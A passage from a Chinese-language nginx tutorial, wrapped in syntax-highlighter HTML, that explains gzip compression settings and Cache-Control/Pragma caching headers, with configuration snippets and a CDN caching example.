class=\"crayon-i\">staff</span>  <span class=\"crayon-cn\">12331</span>  <span class=\"crayon-cn\">3</span> <span class=\"crayon-i\">Nov</span> <span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">48</span> <span class=\"crayon-cn\">1_gzip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d334645307891-4\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span>   <span class=\"crayon-cn\">1</span> <span class=\"crayon-i\">matDobek</span>  <span class=\"crayon-i\">staff</span>  <span class=\"crayon-cn\">12123</span>  <span class=\"crayon-cn\">3</span> <span class=\"crayon-i\">Nov</span> <span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">48</span> <span class=\"crayon-cn\">2_gzip</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d334645307891-5\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span>   <span class=\"crayon-cn\">1</span> <span class=\"crayon-i\">matDobek</span>  <span class=\"crayon-i\">staff</span>  <span class=\"crayon-cn\">12003</span>  <span class=\"crayon-cn\">3</span> <span class=\"crayon-i\">Nov</span> <span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">48</span> <span class=\"crayon-cn\">3_gzip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d334645307891-6\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span>   <span class=\"crayon-cn\">1</span> <span class=\"crayon-i\">matDobek</span>  <span class=\"crayon-i\">staff</span>  <span class=\"crayon-cn\">11264</span>  <span class=\"crayon-cn\">3</span> <span class=\"crayon-i\">Nov</span> <span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">49</span> <span class=\"crayon-cn\">4_gzip</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d334645307891-7\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span>   <span class=\"crayon-cn\">1</span> <span class=\"crayon-i\">matDobek</span>  <span class=\"crayon-i\">staff</span>  <span class=\"crayon-cn\">11111</span>  <span class=\"crayon-cn\">3</span> <span class=\"crayon-i\">Nov</span> <span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">50</span> <span class=\"crayon-cn\">5_gzip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d334645307891-8\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span>   <span class=\"crayon-cn\">1</span> <span class=\"crayon-i\">matDobek</span>  <span class=\"crayon-i\">staff</span>  <span class=\"crayon-cn\">11097</span>  <span class=\"crayon-cn\">3</span> <span class=\"crayon-i\">Nov</span> <span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">50</span> <span class=\"crayon-cn\">6_gzip</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d334645307891-9\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span>   <span class=\"crayon-cn\">1</span> <span class=\"crayon-i\">matDobek</span>  <span class=\"crayon-i\">staff</span>  <span class=\"crayon-cn\">11080</span>  <span class=\"crayon-cn\">3</span> <span class=\"crayon-i\">Nov</span> <span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">50</span> <span class=\"crayon-cn\">7_gzip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d334645307891-10\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span>   <span class=\"crayon-cn\">1</span> <span class=\"crayon-i\">matDobek</span>  <span class=\"crayon-i\">staff</span>  <span class=\"crayon-cn\">11071</span>  <span class=\"crayon-cn\">3</span> <span class=\"crayon-i\">Nov</span> <span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">51</span> <span class=\"crayon-cn\">8_gzip</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d334645307891-11\"><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rw</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">r</span><span class=\"crayon-o\">--</span>   <span class=\"crayon-cn\">1</span> <span class=\"crayon-i\">matDobek</span>  <span class=\"crayon-i\">staff</span>  <span class=\"crayon-cn\">11005</span>  <span class=\"crayon-cn\">3</span> <span class=\"crayon-i\">Nov</span> <span class=\"crayon-cn\">08</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">51</span> <span class=\"crayon-cn\">9_gzip</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0046 seconds] -->\r\n<p></p>\n<h3><code>gzip_http_version 1.1;</code></h3>\n<p>这条指令告诉 nginx 仅在 HTTP 1.1 以上的版本才能使用 gzip。我们在这里不涉及 HTTP 1.0，至于 HTTP 1.0 版本，它是不可能既使用 keep-alive 和 gzip 的。因此你必须做出决定：使用 HTTP 1.0 的客户端要么错过 gzip，要么错过 keep-alive。</p>\n<h3>配置</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d338234342722\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngzip on;               # enable gzip\r\ngzip_http_version 1.1; # turn on gzip for http 1.1 and above\r\ngzip_disable \"msie6\";  # IE 6 had issues with gzip\r\ngzip_comp_level 5;     # inc compresion level, and CPU usage\r\ngzip_min_length 100;   # minimal weight to gzip file\r\ngzip_proxied any;      # enable gzip for proxied requests (e.g. CDN)\r\ngzip_buffers 16 8k;    # compression buffers (if we exceed this value, disk will be used instead of RAM)\r\ngzip_vary on;          # add header Vary Accept-Encoding (more on that in Caching section)\r\n\r\n# define files which should be compressed\r\ngzip_types text/plain;\r\ngzip_types text/css;\r\ngzip_types application/javascript;\r\ngzip_types application/json;\r\ngzip_types application/vnd.ms-fontobject;\r\ngzip_types application/x-font-ttf;\r\ngzip_types font/opentype;\r\ngzip_types image/svg+xml;\r\ngzip_types image/x-icon;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d338234342722-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d338234342722-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d338234342722-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d338234342722-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d338234342722-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d338234342722-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d338234342722-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d338234342722-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d338234342722-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d338234342722-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d338234342722-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d338234342722-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d338234342722-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d338234342722-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d338234342722-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d338234342722-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d338234342722-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d338234342722-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d338234342722-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d338234342722-1\"><span class=\"crayon-i\">gzip</span> <span class=\"crayon-v\">on</span><span class=\"crayon-sy\">;</span>               <span class=\"crayon-p\"># enable gzip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d338234342722-2\"><span class=\"crayon-v\">gzip_http</span><span class=\"crayon-sy\">_</span>version <span class=\"crayon-cn\">1.1</span><span class=\"crayon-sy\">;</span> <span class=\"crayon-p\"># turn on gzip for http 1.1 and above</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d338234342722-3\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>disable <span class=\"crayon-s\">\"msie6\"</span><span class=\"crayon-sy\">;</span>  <span class=\"crayon-p\"># IE 6 had issues with gzip</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d338234342722-4\"><span class=\"crayon-v\">gzip_comp</span><span class=\"crayon-sy\">_</span>level <span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">;</span>     <span class=\"crayon-p\"># inc compresion level, and CPU usage</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d338234342722-5\"><span class=\"crayon-v\">gzip_min</span><span class=\"crayon-sy\">_</span>length <span class=\"crayon-cn\">100</span><span class=\"crayon-sy\">;</span>   <span class=\"crayon-p\"># minimal weight to gzip file</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d338234342722-6\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>proxied <span class=\"crayon-v\">any</span><span class=\"crayon-sy\">;</span>      <span class=\"crayon-p\"># enable gzip for proxied requests (e.g. CDN)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d338234342722-7\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>buffers <span class=\"crayon-cn\">16</span> <span class=\"crayon-cn\">8k</span><span class=\"crayon-sy\">;</span>    <span class=\"crayon-p\"># compression buffers (if we exceed this value, disk will be used instead of RAM)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d338234342722-8\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>vary <span class=\"crayon-v\">on</span><span class=\"crayon-sy\">;</span>          <span class=\"crayon-p\"># add header Vary Accept-Encoding (more on that in Caching section)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d338234342722-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d338234342722-10\"><span class=\"crayon-p\"># define files which should be compressed</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d338234342722-11\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>types <span class=\"crayon-v\">text</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">plain</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d338234342722-12\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>types <span class=\"crayon-v\">text</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">css</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d338234342722-13\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>types <span class=\"crayon-v\">application</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">javascript</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d338234342722-14\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>types <span class=\"crayon-v\">application</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">json</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d338234342722-15\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>types <span class=\"crayon-v\">application</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">vnd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ms</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fontobject</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d338234342722-16\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>types <span class=\"crayon-v\">application</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">font</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ttf</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d338234342722-17\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>types <span class=\"crayon-v\">font</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">opentype</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d338234342722-18\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>types <span class=\"crayon-v\">image</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">svg</span><span class=\"crayon-o\">+</span><span class=\"crayon-v\">xml</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d338234342722-19\"><span class=\"crayon-v\">gzip</span><span class=\"crayon-sy\">_</span>types <span class=\"crayon-v\">image</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">icon</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n<p></p>\n<h1>缓存</h1>\n<p>缓存是另一回事，它能提升用户的请求速度。</p>\n<p>管理缓存可以仅由 2 个 header 控制：</p>\n<ul>\n<li>在 HTTP/1.1 中用 <code>Cache-Control</code> 管理缓存</li>\n<li>Pragma 对于 HTTP/1.0 客户端的向后兼容性</li>\n</ul>\n<p>缓存本身可以分为两类：公共缓存和私有缓存。公共缓存是被多个用户共同使用的。专用缓存专用于单个用户。我们可以很容易地区分，应该使用哪种缓存：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d33c784378165\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nadd_header Cache-Control public;\r\nadd_header Pragma public;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d33c784378165-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d33c784378165-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d33c784378165-1\"><span class=\"crayon-v\">add</span><span class=\"crayon-sy\">_</span>header <span class=\"crayon-v\">Cache</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Control</span> <span class=\"crayon-m\">public</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d33c784378165-2\"><span class=\"crayon-v\">add</span><span class=\"crayon-sy\">_</span>header <span class=\"crayon-i\">Pragma</span> <span class=\"crayon-m\">public</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>对于标准资源，我们想保存1个月：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d33f215922498\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nlocation ~* \\.(jpg|jpeg|png|gif|ico|css|js)$ {\r\n  expires 1M;\r\n  add_header Cache-Control public;\r\n  add_header Pragma public;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d33f215922498-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d33f215922498-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d33f215922498-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d33f215922498-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d33f215922498-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d33f215922498-1\"><span class=\"crayon-i\">location</span> <span class=\"crayon-o\">~</span><span class=\"crayon-o\">*</span> <span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jpg</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">jpeg</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">png</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">gif</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">ico</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">css</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">js</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">$</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d33f215922498-2\">  <span class=\"crayon-i\">expires</span> <span class=\"crayon-cn\">1M</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d33f215922498-3\">  <span class=\"crayon-v\">add</span><span class=\"crayon-sy\">_</span>header <span class=\"crayon-v\">Cache</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">Control</span> <span class=\"crayon-m\">public</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d33f215922498-4\">  <span class=\"crayon-v\">add</span><span class=\"crayon-sy\">_</span>header <span class=\"crayon-i\">Pragma</span> <span class=\"crayon-m\">public</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d33f215922498-5\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>上面的配置似乎足够了。然而，使用公共缓存时有一个注意事项。</p>\n<p>让我们看看如果将我们的资源存储在公共缓存（如 CDN）中，URI 将是唯一的标识符。在这种情况下，我们认为 gzip 是开启的。</p>\n<p>有2个浏览器：</p>\n<ul>\n<li>旧的，不支持 gzip</li>\n<li>新的，支持 gzip</li>\n</ul>\n<p>旧的浏览器给 CDN 发送了一个 netguru.co/style 请求。但是 CDN 也没有这个资源，它将会给我们的服务器发送请求，并且返回未经压缩的响应。CDN 在哈希里存储文件（为以后使用）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d343132829301\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n{\r\n  ...\r\n  netguru.co/styles.css =&gt; FILE(\"/sites/netguru/style.css\")\r\n  ...\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d343132829301-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d343132829301-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d343132829301-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d343132829301-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d343132829301-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d343132829301-1\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d343132829301-2\">  <span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d343132829301-3\">  <span class=\"crayon-v\">netguru</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">co</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">styles</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">css</span> <span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-e\">FILE</span><span class=\"crayon-sy\">(</span><span 